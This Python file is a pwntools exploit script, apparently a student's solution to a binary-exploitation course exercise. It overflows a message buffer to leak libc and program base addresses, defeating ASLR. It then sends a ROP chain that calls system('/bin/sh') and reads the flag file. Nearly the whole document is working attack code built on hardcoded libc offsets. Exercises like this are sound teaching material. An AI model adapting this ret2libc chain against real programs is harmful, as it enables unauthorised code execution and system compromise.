#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

IOstd_out_offset = 0x00000000001ed6a0
system_offset = 0x0000000000052290
binsh_offset = 0x1b45bd # strings -t x -a /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep "/bin/sh"


def get_libc_base_address():
    print(r.recvuntil(b'Enter the message you want to send:\n'))
    r.sendline(b'A' * 168)
    hint = r.recvline()  ### Oh. xxx?! Really?Thanks for your message.
    print(hint)
    libc_base_address = int.from_bytes(hint[172: 178], "little") - IOstd_out_offset
    return libc_base_address


def get_binary_base_address():
    print(r.recvuntil(b'Enter the message you want to send:\n'))
    r.sendline(b'A' * 272)
    hint = r.recvline()  ### Oh. xxx?! Really?Thanks for your message.
    print(hint)
    binary_base_address = int.from_bytes(hint[276: 282], "little") - elf.symbols['_start']
    return binary_base_address


r = start()

elf = ELF(exe)
rop = ROP(elf)

libc_base_address = get_libc_base_address()
system_address = libc_base_address + system_offset
binsh_address = libc_base_address + binsh_offset
binary_base_address = get_binary_base_address()

print(hex(system_address))
print(hex(binsh_address))
print(hex(binary_base_address))

padding = b'A' * (288 + 8)
gadget1 = rop.find_gadget(["pop rdi", "ret"])[0] + binary_base_address
gadget2 = (rop.find_gadget(["ret"]))[0] + binary_base_address

command = padding + p64(gadget1) + p64(binsh_address) + p64(gadget2) + p64(system_address)
r.sendline(command)
r.sendline(b"cat flag")

print(r.recvall(timeout=4))
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

